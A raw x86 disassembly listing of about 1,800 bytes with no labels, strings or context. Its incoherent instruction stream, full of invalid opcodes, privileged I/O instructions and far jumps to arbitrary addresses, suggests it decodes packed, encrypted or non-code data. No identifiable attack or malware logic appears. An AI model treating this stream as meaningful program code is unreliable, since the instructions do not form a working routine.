  40dff2:	or     ecx,DWORD PTR [ebp-0x78]
  40dff5:	jecxz  0x40e044
  40dff7:	sti    
  40dff8:	scas   eax,DWORD PTR es:[edi]
  40dff9:	sbb    bl,dh
  40dffb:	(bad)  
  40dffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dffd:	loopne 0x40e045
  40dfff:	rcr    DWORD PTR [ebp-0x841d9f9],0xba
  40e006:	sbb    eax,0x6cae8348
  40e00b:	mov    ds:0x2dfd34e1,al
  40e010:	sbb    al,0xe4
  40e012:	mov    esp,0x18a638cb
  40e017:	enter  0x9c42,0x64
  40e01b:	mov    ecx,0x38762825
  40e020:	in     al,dx
  40e021:	sbb    al,0x9e
  40e023:	repz jno 0x40dfd9
  40e026:	inc    edi
  40e027:	sar    BYTE PTR [ebx],1
  40e029:	stos   DWORD PTR es:[edi],eax
  40e02a:	add    ecx,eax
  40e02c:	pop    eax
  40e02d:	mov    bl,BYTE PTR [ebx+0x2097f5fa]
  40e033:	cs jmp 0x40dfbd
  40e036:	add    dh,cl
  40e038:	mov    bh,0x51
  40e03a:	mov    edi,0xc1dc8b03
  40e03f:	cmp    al,0x88
  40e041:	jmp    0x40e067
  40e043:	rol    BYTE PTR [ebx+0x16],1
  40e046:	and    BYTE PTR [edi+0x23d636e6],cl
  40e04c:	inc    ebx
  40e04d:	aaa    
  40e04e:	popf   
  40e04f:	cmp    DWORD PTR [ecx+0x4dce27ec],ebx
  40e055:	ror    BYTE PTR [ecx+0x7d],cl
  40e058:	stos   DWORD PTR es:[edi],eax
  40e059:	mov    ecx,0x847ac31c
  40e05e:	scas   eax,DWORD PTR es:[edi]
  40e05f:	sub    ch,bl
  40e061:	sbb    al,BYTE PTR [edi+0x3f]
  40e064:	test   eax,0xb81ae4d
  40e069:	frstor [eax-0x62]
  40e06c:	ret    
  40e06d:	std    
  40e06e:	jl     0x40dff9
  40e070:	sub    ebp,DWORD PTR [ebx-0x53]
  40e073:	(bad)  
  40e074:	jmp    0x40e04d
  40e076:	adc    DWORD PTR [ecx],ebp
  40e078:	add    al,0xde
  40e07a:	les    eax,FWORD PTR [ecx+0x68]
  40e07d:	fild   QWORD PTR [ebp-0x2b]
  40e080:	je     0x40e02b
  40e082:	jno    0x40e074
  40e084:	int    0xda
  40e086:	cwde   
  40e087:	(bad)  
  40e088:	jmp    0x40e06e
  40e08a:	mov    ch,0xbd
  40e08c:	es loop 0x40e0aa
  40e08f:	jnp    0x40e0e9
  40e091:	fbld   TBYTE PTR [edi+0x20]
  40e094:	mov    dl,al
  40e096:	cwde   
  40e097:	addr16 in al,0xb9
  40e09a:	std    
  40e09b:	pop    edi
  40e09c:	or     DWORD PTR [ebp-0x6b],esi
  40e09f:	mov    esi,0x103d8577
  40e0a4:	es aad 0x2a
  40e0a7:	leave  
  40e0a8:	sbb    dl,BYTE PTR [eax+0x6f]
  40e0ab:	adc    edx,DWORD PTR [edx+0x24f45f69]
  40e0b1:	adc    DWORD PTR [edx],esp
  40e0b3:	cmp    ebp,0x2abce018
  40e0b9:	xchg   ebx,eax
  40e0ba:	adc    ah,BYTE PTR [eax]
  40e0bc:	mov    bl,0x47
  40e0be:	rcr    DWORD PTR [edx+0x63a5e03c],1
  40e0c4:	jle    0x40e140
  40e0c6:	repnz daa 
  40e0c8:	add    al,0xa2
  40e0ca:	ins    DWORD PTR es:[edi],dx
  40e0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0cc:	mov    al,ds:0x2aa0039f
  40e0d1:	aaa    
  40e0d2:	and    esp,0x6b
  40e0d5:	popa   
  40e0d6:	xchg   BYTE PTR [ebx],al
  40e0d8:	pop    eax
  40e0d9:	les    ebx,FWORD PTR [ebp+0x3edf252a]
  40e0df:	xor    esp,edi
  40e0e1:	dec    eax
  40e0e2:	xchg   esp,eax
  40e0e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0e4:	xor    eax,DWORD PTR [ebp-0x3]
  40e0e7:	(bad)  
  40e0e8:	cli    
  40e0e9:	add    DWORD PTR [ebp+0x52],ecx
  40e0ec:	shl    BYTE PTR [eax+0x3ecac7fd],0x79
  40e0f3:	xlat   BYTE PTR ds:[ebx]
  40e0f4:	pop    ss
  40e0f5:	sbb    eax,0x4ce8ee8a
  40e0fa:	fisub  WORD PTR [ebx+0x38bd6dd3]
  40e100:	push   0xe4c87cbd
  40e105:	sti    
  40e106:	xor    BYTE PTR [ecx+0x2b],0xa3
  40e10a:	jmp    0x40e147
  40e10c:	call   0xe66e9844
  40e111:	fisub  DWORD PTR [esi+0x7de949c8]
  40e117:	in     al,0xfb
  40e119:	mov    ah,0xfc
  40e11b:	or     bl,BYTE PTR [edx]
  40e11d:	cwde   
  40e11e:	repnz xchg ecx,eax
  40e120:	imul   esi,ecx,0x55
  40e123:	enter  0x146f,0x20
  40e127:	pop    es
  40e128:	pop    ebx
  40e129:	(bad)  
  40e12a:	int3   
  40e12b:	dec    edi
  40e12c:	adc    edx,edi
  40e12e:	cld    
  40e12f:	push   ecx
  40e130:	retf   
  40e131:	mov    dl,0x16
  40e133:	xor    eax,DWORD PTR [eax+0x28c75202]
  40e139:	xchg   ecx,eax
  40e13a:	push   cs
  40e13b:	fwait
  40e13c:	dec    eax
  40e13d:	lahf   
  40e13e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e13f:	cmc    
  40e140:	jle    0x40e13a
  40e142:	cld    
  40e143:	arpl   WORD PTR [edx+eiz*2-0x4f],cx
  40e147:	int3   
  40e148:	gs loopne 0x40e19c
  40e14b:	enter  0xfee,0x35
  40e14f:	add    ah,0x1f
  40e152:	shr    DWORD PTR [ecx-0xb],cl
  40e155:	jnp    0x40e195
  40e157:	shr    ebx,0x77
  40e15a:	(bad)  
  40e15b:	ror    DWORD PTR [ebp+eiz*1+0x47],1
  40e15f:	into   
  40e160:	xor    al,0x29
  40e162:	repnz cdq 
  40e164:	imul   ebp,DWORD PTR [edi-0x30],0xffffffd4
  40e168:	call   0xd689:0xcf2dfcf8
  40e16f:	adc    al,0x76
  40e171:	cmp    esi,esi
  40e173:	(bad)  
  40e174:	jae    0x40e11c
  40e176:	icebp  
  40e177:	fst    DWORD PTR [ebx+0x4f]
  40e17a:	imul   ebp,DWORD PTR [esi+0x546565f5],0xffffffe6
  40e181:	pop    ebx
  40e182:	mov    eax,0x70b49b2b
  40e187:	int    0x86
  40e189:	fist   WORD PTR [esi+0x562bf4ba]
  40e18f:	hlt    
  40e190:	cdq    
  40e191:	xchg   edx,eax
  40e192:	std    
  40e193:	pop    ds
  40e194:	cmp    DWORD PTR [ebp-0x5e],edi
  40e197:	xchg   ecx,esp
  40e199:	fsubr  QWORD PTR [ecx]
  40e19b:	enter  0x7ac,0x21
  40e19f:	sbb    BYTE PTR [edx+eiz*1+0x3feb1283],0x8a
  40e1a7:	cs mov edi,0x7950b653
  40e1ad:	fcomip st,st(7)
  40e1af:	and    al,0x43
  40e1b1:	cld    
  40e1b2:	push   esp
  40e1b3:	xchg   esi,eax
  40e1b4:	ds cli 
  40e1b6:	cld    
  40e1b7:	loopne 0x40e1b6
  40e1b9:	sub    eax,edx
  40e1bb:	push   ecx
  40e1bc:	rol    BYTE PTR [eax+0x5d4fb724],cl
  40e1c2:	mov    es,ebp
  40e1c4:	mov    esi,0xe24b6105
  40e1c9:	push   0xffffff8d
  40e1cb:	inc    edi
  40e1cc:	inc    ebp
  40e1cd:	lods   al,BYTE PTR ds:[esi]
  40e1ce:	cld    
  40e1cf:	jl     0x40e181
  40e1d1:	mov    esi,0x80dd8bdc
  40e1d6:	cmp    eax,ecx
  40e1d8:	stos   BYTE PTR es:[edi],al
  40e1d9:	je     0x40e1a5
  40e1db:	mov    al,0xb2
  40e1dd:	jae    0x40e21d
  40e1df:	mov    ds:0x914bebe7,al
  40e1e4:	stc    
  40e1e5:	sar    BYTE PTR [esi+eax*4-0x382e84aa],1
  40e1ec:	leave  
  40e1ed:	inc    esi
  40e1ee:	dec    eax
  40e1ef:	out    0x8,eax
  40e1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1f2:	and    bl,BYTE PTR [esi]
  40e1f4:	call   FWORD PTR [ebx+0xf]
  40e1f7:	fsubr  QWORD PTR [ebx-0x35]
  40e1fa:	(bad)  [eax-0x1f5efa5b]
  40e200:	div    DWORD PTR ds:0x806bab68
  40e206:	rcr    DWORD PTR [ebx],0x57
  40e209:	je     0x40e18e
  40e20b:	std    
  40e20c:	jmp    0x40e24f
  40e20e:	and    ch,BYTE PTR [esi-0x7c]
  40e211:	fnstenv [edx+0x5d8d6b3]
  40e217:	inc    esp
  40e218:	outs   dx,DWORD PTR ds:[esi]
  40e219:	cmp    al,0x7d
  40e21b:	daa    
  40e21c:	lahf   
  40e21d:	xor    al,0x2f
  40e21f:	mov    bh,0xeb
  40e221:	sub    bh,BYTE PTR [edi]
  40e223:	scas   eax,DWORD PTR es:[edi]
  40e224:	xor    BYTE PTR [edx-0x28],bh
  40e227:	in     eax,dx
  40e228:	jp     0x40e209
  40e22a:	push   esp
  40e22b:	aaa    
  40e22c:	push   esi
  40e22d:	inc    edi
  40e22e:	add    ch,BYTE PTR [eax]
  40e230:	dec    edx
  40e231:	push   es
  40e232:	std    
  40e233:	push   es
  40e234:	inc    ecx
  40e235:	sbb    eax,DWORD PTR [ecx-0x22]
  40e238:	out    0x72,eax
  40e23a:	jge    0x40e204
  40e23c:	inc    ebx
  40e23d:	ret    0x989f
  40e240:	add    edi,DWORD PTR [ecx+0x33]
  40e243:	pop    esp
  40e244:	jmp    0x40e256
  40e246:	gs js  0x40e2a7
  40e249:	dec    ebp
  40e24a:	pop    edx
  40e24b:	and    al,0x26
  40e24d:	fild   QWORD PTR [esi]
  40e24f:	pop    ss
  40e250:	lods   al,BYTE PTR ds:[esi]
  40e251:	in     eax,dx
  40e252:	retf   
  40e253:	nop
  40e254:	xchg   edi,eax
  40e255:	push   esp
  40e256:	std    
  40e257:	sbb    ebp,DWORD PTR [edi-0x6a25de86]
  40e25d:	pop    ebp
  40e25e:	cmp    cl,dl
  40e260:	add    BYTE PTR [ebx-0x6c25f78d],bh
  40e266:	shl    BYTE PTR [edi+0x2743cf0b],0xe4
  40e26d:	psllw  mm6,QWORD PTR [ebp-0x700bfd61]
  40e274:	out    dx,al
  40e275:	jg     0x40e231
  40e277:	adc    esi,edi
  40e279:	not    DWORD PTR [ebx+0x186119c8]
  40e27f:	test   eax,0x8750c21c
  40e284:	jmp    0x40e220
  40e286:	xchg   ebp,eax
  40e287:	pop    es
  40e288:	test   al,0xb3
  40e28a:	sub    al,0xda
  40e28c:	fistp  QWORD PTR ss:[ebp*1+0x5dec8103]
  40e294:	and    bl,al
  40e296:	and    al,0xfc
  40e298:	or     eax,0xc1fdfcf3
  40e29d:	adc    ecx,ecx
  40e29f:	adc    al,0x39
  40e2a1:	iret   
  40e2a2:	pushf  
  40e2a3:	enter  0xaf7a,0x8d
  40e2a7:	outs   dx,DWORD PTR ds:[esi]
  40e2a8:	inc    edx
  40e2a9:	cmp    DWORD PTR [ecx+eax*1-0x54e48501],esp
  40e2b0:	sub    ecx,DWORD PTR ds:0xf872bb1c
  40e2b6:	in     eax,dx
  40e2b7:	enter  0xda7f,0x91
  40e2bb:	popa   
  40e2bc:	call   0xc32958ca
  40e2c1:	scas   al,BYTE PTR es:[edi]
  40e2c2:	cld    
  40e2c3:	jb     0x40e2b2
  40e2c5:	push   ds
  40e2c6:	dec    ebx
  40e2c7:	jo     0x40e2b0
  40e2c9:	xor    DWORD PTR [ebx],ebp
  40e2cb:	enter  0x4fba,0xe7
  40e2cf:	mov    esi,0x5b6b4b0c
  40e2d4:	jmp    0x40e351
  40e2d6:	mov    ch,0x39
  40e2d8:	retf   
  40e2d9:	gs sub eax,0x9edf463f
  40e2df:	push   0xdc98dca3
  40e2e4:	sbb    eax,esi
  40e2e6:	cld    
  40e2e7:	inc    eax
  40e2e8:	jae    0x40e330
  40e2ea:	mov    cl,0x4b
  40e2ec:	xchg   BYTE PTR [ebx],al
  40e2ee:	retf   0xb7c8
  40e2f1:	bound  ebp,QWORD PTR [edi]
  40e2f3:	sar    BYTE PTR [esi+ecx*8],0x1c
  40e2f7:	in     eax,dx
  40e2f8:	xchg   edi,eax
  40e2f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2fa:	cld    
  40e2fb:	in     eax,dx
  40e2fc:	sbb    al,0xaf
  40e2fe:	repnz inc ebx
  40e300:	out    0xd2,al
  40e302:	push   0xffffffc8
  40e304:	arpl   WORD PTR [edi+0x6],sp
  40e307:	adc    dh,BYTE PTR ds:[ebx+0x5a]
  40e30b:	xchg   DWORD PTR [edi],edx
  40e30d:	xchg   ebp,eax
  40e30e:	cld    
  40e30f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e310:	inc    ebx
  40e311:	aam    0x98
  40e313:	or     DWORD PTR [ecx+0x13],edi
  40e316:	and    eax,ecx
  40e318:	mul    BYTE PTR [eax]
  40e31a:	js     0x40e35e
  40e31c:	xor    bl,BYTE PTR [edi+0x6aebed0f]
  40e322:	xor    DWORD PTR [ebp+0x60],eax
  40e325:	std    
  40e326:	ror    BYTE PTR [ecx-0x25],1
  40e329:	fistp  QWORD PTR [eax]
  40e32b:	fild   DWORD PTR [eax+0x21]
  40e32e:	inc    esp
  40e32f:	push   edi
  40e330:	ss xchg ecx,eax
  40e332:	std    
  40e333:	(bad)  
  40e334:	(bad)  
  40e335:	mov    bh,0xd2
  40e337:	or     dh,BYTE PTR [ebp+edx*2-0x341e38c6]
  40e33e:	fadd   st,st(3)
  40e340:	pushf  
  40e341:	out    dx,eax
  40e342:	(bad)  
  40e343:	mov    dh,0x5
  40e345:	jg     0x40e344
  40e347:	fiadd  WORD PTR [ebx+0xa328602]
  40e34d:	cmp    DWORD PTR [ebx+0x382794c8],esp
  40e353:	lods   al,BYTE PTR ds:[esi]
  40e354:	sub    eax,0x9e31a822
  40e359:	lods   eax,DWORD PTR ds:[esi]
  40e35a:	in     eax,0x70
  40e35c:	sub    al,0x5f
  40e35e:	outs   dx,BYTE PTR ds:[esi]
  40e35f:	ffree  st(7)
  40e361:	xchg   edx,eax
  40e362:	sub    ah,BYTE PTR [eax-0x3234203d]
  40e368:	(bad)  
  40e369:	std    
  40e36a:	inc    edx
  40e36b:	mov    ch,0x76
  40e36d:	jmp    0x5aea:0x18ef4bfc
  40e374:	sbb    al,0x60
  40e376:	and    al,cl
  40e378:	mov    DWORD PTR [ebx],esi
  40e37a:	hlt    
  40e37b:	outs   dx,BYTE PTR ds:[esi]
  40e37c:	xor    al,BYTE PTR [ecx+eiz*2+0x3b9ae65f]
  40e383:	imul   eax,edx,0x4c
  40e386:	(bad)  [esi]
  40e388:	add    eax,0x363ff7c5
  40e38d:	frstor [eax+0xa8cb7bd]
  40e393:	ror    BYTE PTR [ebx],1
  40e395:	jge    0x40e3a9
  40e397:	jae    0x40e3a4
  40e399:	sar    ah,0x9a
  40e39c:	stc    
  40e39d:	xchg   esp,eax
  40e39e:	push   0x2f
  40e3a0:	sub    ecx,DWORD PTR [eax+0x79]
  40e3a3:	enter  0xb28d,0x9b
  40e3a7:	cmc    
  40e3a8:	sbb    DWORD PTR [eax-0x50dc38c3],edx
  40e3ae:	cld    
  40e3af:	addr16 dec ecx
  40e3b1:	inc    ax
  40e3b3:	cwde   
  40e3b4:	pop    ecx
  40e3b5:	cmp    eax,DWORD PTR [edx]
  40e3b7:	out    dx,al
  40e3b8:	data16 sub BYTE PTR [ecx],bl
  40e3bb:	enter  0xe5a1,0x1d
  40e3bf:	xor    al,0x12
  40e3c1:	test   al,0xfc
  40e3c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3c4:	mov    cl,0x84
  40e3c6:	(bad)  
  40e3c7:	and    ebp,eax
  40e3c9:	mov    ah,0xc4
  40e3cb:	enter  0x7cc,0xc0
  40e3cf:	mov    edx,0x66f3cf59
  40e3d4:	mov    al,ds:0x7db7fd34
  40e3d9:	add    eax,0x9d61f3d8
  40e3de:	add    edi,0xe5c016bf
  40e3e4:	hlt    
  40e3e5:	aas    
  40e3e6:	fisttp DWORD PTR [eax]
  40e3e8:	cmp    ecx,0x9beb5ba0
  40e3ee:	pop    ds
  40e3ef:	add    edi,DWORD PTR [esi]
  40e3f1:	push   ecx
  40e3f2:	adc    ebp,eax
  40e3f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3f5:	push   ecx
  40e3f6:	(bad)  
  40e3f7:	enter  0x2dd2,0x10
  40e3fb:	int3   
  40e3fc:	jo     0x40e3e0
  40e3fe:	fadd   DWORD PTR [edx-0x6dcfe15e]
  40e404:	jmp    0x40e44c
  40e406:	and    eax,0x34c93caa
  40e40b:	repnz fmul st,st(0)
  40e40e:	sbb    al,0xc5
  40e410:	fs inc edi
  40e412:	cld    
  40e413:	mul    BYTE PTR [edx+0x786d7f1f]
  40e419:	sub    ebp,edi
  40e41b:	pop    edx
  40e41c:	mov    BYTE PTR [esi],bh
  40e41e:	pop    ss
  40e41f:	sbb    ebx,DWORD PTR [edi-0xf]
  40e422:	(bad)  
  40e423:	retf   0x4b0e
  40e426:	test   DWORD PTR [edi-0x3935708],ecx
  40e42c:	shl    BYTE PTR [esi-0x3],0x7d
  40e430:	mov    ss,WORD PTR [edi+ebp*4-0x66]
  40e434:	loopne 0x40e416
  40e436:	jecxz  0x40e401
  40e438:	push   ds
  40e439:	lods   eax,DWORD PTR ds:[esi]
  40e43a:	(bad)  
  40e43b:	leave  
  40e43c:	mov    edx,0x23ad3fdd
  40e441:	rol    DWORD PTR [edi+edx*1+0x501f4deb],cl
  40e448:	add    BYTE PTR [ecx-0x6e],al
  40e44b:	les    esp,FWORD PTR [ebp+0x53]
  40e44e:	call   0x7420:0xc64c2bc8
  40e455:	ds cmp al,0xae
  40e458:	in     al,0x62
  40e45a:	jmp    0x8c81a726
  40e45f:	arpl   di,bp
  40e461:	push   edi
  40e462:	mov    edi,DWORD PTR [ebp+0x7e80f805]
  40e468:	scas   eax,DWORD PTR es:[edi]
  40e469:	pop    ds
  40e46a:	sbb    eax,0xef92cc4b
  40e46f:	sub    dh,bl
  40e471:	outs   dx,DWORD PTR ds:[esi]
  40e472:	xchg   ecx,eax
  40e473:	xchg   ebp,eax
  40e474:	jmp    0x40e499
  40e476:	add    edx,DWORD PTR [ebx+esi*8]
  40e479:	mov    DWORD PTR [eax-0x720527c],edx
  40e47f:	xchg   edx,eax
  40e480:	cld    
  40e481:	repnz push ds
  40e483:	retf   0x6eac
  40e486:	call   0x1ca033fb
  40e48b:	xor    al,0xa2
  40e48d:	out    dx,eax
  40e48e:	sub    eax,0xab4523df
  40e493:	cwde   
  40e494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e495:	fistp  QWORD PTR [esi]
  40e497:	inc    eax
  40e498:	and    eax,0xc0bf912d
  40e49d:	mov    esi,0xe4b821fc
  40e4a2:	pop    ds
  40e4a3:	outs   dx,BYTE PTR ds:[esi]
  40e4a4:	xor    dh,dh
  40e4a6:	mov    dl,0xc8
  40e4a8:	dec    ecx
  40e4a9:	(bad)  
  40e4aa:	test   DWORD PTR [esi],eax
  40e4ac:	dec    ebx
  40e4ad:	mov    eax,edi
  40e4af:	push   esi
  40e4b0:	jmp    0x40e497
  40e4b2:	and    cl,BYTE PTR [esi+0x65]
  40e4b5:	pop    esp
  40e4b6:	jb     0x40e44b
  40e4b8:	loop   0x40e499
  40e4ba:	loopne 0x40e4e6
  40e4bc:	jl     0x40e464
  40e4be:	iret   
  40e4bf:	mov    ebp,?
  40e4c1:	xchg   ebp,eax
  40e4c2:	cld    
  40e4c3:	pop    es
  40e4c4:	pop    esi
  40e4c5:	xchg   esi,eax
  40e4c6:	dec    edx
  40e4c7:	stc    
  40e4c8:	push   ss
  40e4c9:	loop   0x40e456
  40e4cb:	enter  0x7577,0x0
  40e4cf:	push   es
  40e4d0:	lods   al,BYTE PTR ds:[esi]
  40e4d1:	jbe    0x40e466
  40e4d3:	jae    0x40e4c0
  40e4d5:	cli    
  40e4d6:	mov    ds:0xe907c57b,eax
  40e4db:	in     eax,dx
  40e4dc:	push   eax
  40e4dd:	fisttp WORD PTR [esi+0x2b335c98]
  40e4e3:	clc    
  40e4e4:	sbb    DWORD PTR ds:0x68b62fd,0xbe0db24b
  40e4ee:	in     al,dx
  40e4ef:	(bad)  
  40e4f0:	(bad)  
  40e4f2:	cmp    BYTE PTR [esi-0x7],0x57
  40e4f6:	mov    eax,ds:0xbd92eb46
  40e4fb:	ins    DWORD PTR es:[edi],dx
  40e4fc:	fsub   QWORD PTR [ebp+0x3e]
  40e4ff:	in     al,dx
  40e500:	(bad)  
  40e501:	fbld   TBYTE PTR [ebp+0x66]
  40e504:	pushf  
  40e505:	jmp    0x6cae:0xd9d28d24
  40e50c:	jmp    0x40e4aa
  40e50e:	mov    bl,0x3f
  40e510:	dec    esi
  40e511:	cmc    
  40e512:	inc    esi
  40e513:	test   eax,0xed5edf79
  40e518:	mov    DWORD PTR [edi+0x6fa79955],esi
  40e51e:	std    
  40e51f:	repz inc edi
  40e521:	bound  ebx,QWORD PTR [esi+0x0]
  40e524:	push   ecx
  40e525:	das    
  40e526:	inc    bh
  40e528:	pop    esi
  40e529:	dec    esi
  40e52a:	mov    eax,eax
  40e52c:	inc    eax
  40e52d:	pushf  
  40e52e:	push   esp
  40e52f:	lods   eax,DWORD PTR ds:[esi]
  40e530:	jmp    0x40e4e6
  40e532:	mov    ds:0x254d8e48,eax
  40e537:	pop    es
  40e538:	repz (bad) 
  40e53b:	(bad)  [edx-0x3a706ac2]
  40e541:	je     0x40e53f
  40e543:	push   DWORD PTR [ebx+0x4bbd72d4]
  40e549:	pusha  
  40e54a:	aad    0xee
  40e54c:	(bad)  
  40e54d:	fild   QWORD PTR [ebp+0x5a]
  40e550:	pop    es
  40e551:	mov    ebp,0x10657c6
  40e556:	cdq    
  40e557:	mov    ebx,ebp
  40e559:	sbb    eax,0xdbb9da5b
  40e55e:	sbb    BYTE PTR [ecx+0x7f],bl
  40e561:	or     dh,BYTE PTR [edi]
  40e563:	push   esp
  40e564:	jmp    0x40e5df
  40e566:	pop    edi
  40e567:	(bad)  [edx+0x8]
  40e56a:	(bad)
  40e56e:	lods   al,BYTE PTR ds:[esi]
  40e56f:	test   DWORD PTR [ecx+0x784567c6],ecx
  40e575:	cmp    eax,0xc214c7d1
  40e57a:	daa    
  40e57b:	mov    ebx,0x11d9dde3
  40e580:	jmp    0x40e5cc
  40e582:	mov    al,ds:0x2cd53d8f
  40e587:	sub    DWORD PTR [ebp-0x500d3e21],esp
  40e58d:	outs   dx,DWORD PTR ds:[esi]
  40e58e:	sar    BYTE PTR [ebx+0x36ffbb55],cl
  40e594:	retf   0x9998
  40e597:	pop    ss
  40e598:	call   0x8a56:0x6b5c7d70
  40e59f:	mov    DWORD PTR [ecx-0x26],0x6f68082d
  40e5a6:	and    BYTE PTR [esi-0x5f],cl
  40e5a9:	cmp    ch,bh
  40e5ab:	mov    cl,0x66
  40e5ad:	popf   
  40e5ae:	mov    edx,0x4012788c
  40e5b3:	retf   
  40e5b4:	jl     0x40e597
  40e5b6:	lods   al,BYTE PTR ds:[esi]
  40e5b7:	push   ebx
  40e5b8:	mov    ecx,0xba6ad43
  40e5bd:	clc    
  40e5be:	sti    
  40e5bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5c0:	shl    DWORD PTR [ecx],1
  40e5c2:	repnz push eax
  40e5c4:	inc    esi
  40e5c5:	cdq    
  40e5c6:	ins    BYTE PTR es:[edi],dx
  40e5c7:	leave  
  40e5c8:	gs jg  0x40e585
  40e5cb:	enter  0xea5,0x95
  40e5cf:	ret    0x65c5
  40e5d2:	ins    DWORD PTR es:[edi],dx
  40e5d3:	fsubp  st(3),st
  40e5d5:	add    al,0x8
  40e5d7:	lock jmp 0xe3e9:0x7b49fb55
  40e5df:	jae    0x40e5bc
  40e5e1:	lahf   
  40e5e2:	lds    esi,FWORD PTR [edi-0x18d2e1bf]
  40e5e8:	jmp    0x40e5b2
  40e5ea:	test   DWORD PTR [ebx-0x31ff0056],eax
  40e5f0:	lahf   
  40e5f1:	fisttp WORD PTR [edx]
  40e5f3:	jns    0x40e596
  40e5f5:	popa   
  40e5f6:	jp     0x40e5dc
  40e5f8:	xchg   esp,edi
  40e5fa:	sti    
  40e5fb:	(bad)  
  40e5fc:	out    dx,al
  40e5fd:	sbb    al,0xcf
  40e5ff:	sbb    ebx,ebx
  40e601:	cmp    al,0xb1
  40e603:	retf   
  40e604:	and    edi,ebx
  40e606:	mov    ecx,0x3fc147fc
  40e60b:	aam    0x2b
  40e60d:	mov    ebp,0xdbbf330e
  40e612:	mov    ebp,0xc96f75da
  40e617:	push   ss
  40e618:	mov    esi,0x6daf9edf
  40e61d:	pop    es
  40e61e:	call   0xfd76e28d
  40e623:	and    ecx,DWORD PTR [ebx]
  40e625:	push   0xffffffb5
  40e627:	div    ecx
  40e629:	nop
  40e62a:	(bad)
  40e62e:	mov    WORD PTR [ebx+eax*4-0x1432db9f],gs
  40e635:	inc    edi
  40e636:	les    esp,FWORD PTR [esp+eax*4+0x56]
  40e63a:	dec    ebp
  40e63b:	sahf   
  40e63c:	iret   
  40e63d:	fucomip st,st(2)
  40e63f:	xchg   edi,eax
  40e640:	sub    eax,0x156e2c6
  40e645:	xchg   DWORD PTR ds:0x635aeb9a,ebp
  40e64b:	out    dx,eax
  40e64c:	mov    dl,0x1b
  40e64e:	jo     0x40e624
  40e650:	pusha  
  40e651:	fbstp  TBYTE PTR [ebp-0x67]
  40e654:	aad    0xad
  40e656:	mov    dl,bl
  40e658:	adc    DWORD PTR [esi-0x3],ebp
  40e65b:	repnz (bad) 
  40e65d:	jge    0x40e65a
  40e65f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e660:	or     al,0x6c
  40e662:	jecxz  0x40e627
  40e664:	bound  esp,QWORD PTR [esi+0x1c160885]
  40e66a:	add    esi,eax
  40e66c:	or     esp,esi
  40e66e:	fist   WORD PTR [eax]
  40e670:	ret    
  40e671:	add    esi,DWORD PTR [eax-0x37]
  40e674:	sbb    eax,0x97142c76
  40e679:	dec    ebx
  40e67a:	lds    ebx,FWORD PTR [ebx]
  40e67c:	jns    0x40e65d
  40e67e:	icebp  
  40e67f:	and    eax,0xdfc14f98
  40e684:	cmp    BYTE PTR [ecx+eax*1-0x30],0x69
  40e689:	jp     0x40e6d7
  40e68b:	sbb    eax,0xc820395b
  40e690:	pushf  
  40e691:	sar    DWORD PTR [ebp-0x22],cl
  40e694:	shr    DWORD PTR [edx+0x4d7b6244],1
  40e69a:	add    al,0x91
  40e69c:	stos   BYTE PTR es:[edi],al
  40e69d:	inc    edx
  40e69e:	std    
  40e69f:	dec    edx
  40e6a0:	mov    al,0x45
  40e6a2:	mov    ebp,0x1205762f
  40e6a7:	pop    eax
  40e6a8:	jmp    0x40e729
  40e6aa:	lods   eax,DWORD PTR ds:[esi]
  40e6ab:	fadd   DWORD PTR [eax-0x6a]
  40e6ae:	adc    al,0x52
  40e6b0:	jmp    0x40e6ff
  40e6b2:	les    edi,FWORD PTR [ebp+0x26]
  40e6b5:	mov    cl,BYTE PTR [eax+0x6d]
  40e6b8:	push   ebx
  40e6b9:	fild   WORD PTR [edi]
  40e6bb:	push   es
  40e6bc:	retf   
  40e6bd:	data16 and ah,BYTE PTR [ebx-0x5b]
  40e6c1:	scas   eax,DWORD PTR es:[edi]
  40e6c2:	cld    
  40e6c3:	lock fcom QWORD PTR [ebp+ebx*1+0x5c]
  40e6c8:	jo     0x40e6f0
  40e6ca:	cwde   
  40e6cb:	enter  0x3057,0xef
  40e6cf:	dec    ebp
  40e6d0:	and    esp,edi
  40e6d2:	pop    eax
  40e6d3:	jecxz  0x40e6c2
  40e6d5:	add    DWORD PTR [edx],edi
  40e6d7:	popa   
  40e6d8:	cmp    bl,BYTE PTR [edi-0x237b52b1]
  40e6de:	fadd   st(7),st
  40e6e0:	jecxz  0x40e6c2
  40e6e2:	out    dx,eax
  40e6e3:	in     eax,dx
  40e6e4:	mov    dh,0x21
  40e6e6:	fbstp  TBYTE PTR [esi+0x5306f8eb]
  40e6ec:	call   0x97cc:0x5701273
  40e6f3:	enter  0x8b7c,0xaf
  40e6f7:	popa   
  40e6f8:	sbb    eax,0xeb5cff0b
  40e6fd:	add    ebp,ebp
  40e6ff:	test   dl,dl
  40e701:	sub    esp,DWORD PTR ds:0xffe0dc24
  40e707:	xor    BYTE PTR [edi-0x53277be4],ah
  40e70d:	add    dl,dl
  40e70f:	mov    ah,0xeb
  40e711:	nop
  40e712:	dec    ebp
  40e713:	stc    
  40e714:	icebp  
  40e715:	leave  
  40e716:	icebp  
  40e717:	mov    al,ds:0x10e1dc9b
  40e71c:	jo     0x40e748
  40e71e:	jecxz  0x40e6e5
  40e720:	ins    BYTE PTR es:[edi],dx
  40e721:	ja     0x40e732
  40e723:	sub    al,0x26
  40e725:	sub    ebp,edi
  40e727:	sti    
  40e728:	pop    esp
  40e729:	data16 cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  40e72c:	das    
  40e72d:	inc    ecx
  40e72e:	mov    al,ds:0xf47470bd
  40e733:	pop    es
  40e734:	xor    BYTE PTR [ebp-0x242e08e1],bh
  40e73a:	(bad)  
  40e73b:	push   ebx
  40e73c:	punpckhwd mm6,QWORD PTR [eax]
  40e73f:	arpl   bp,bp
  40e741:	lahf   
  40e742:	jb     0x40e74b
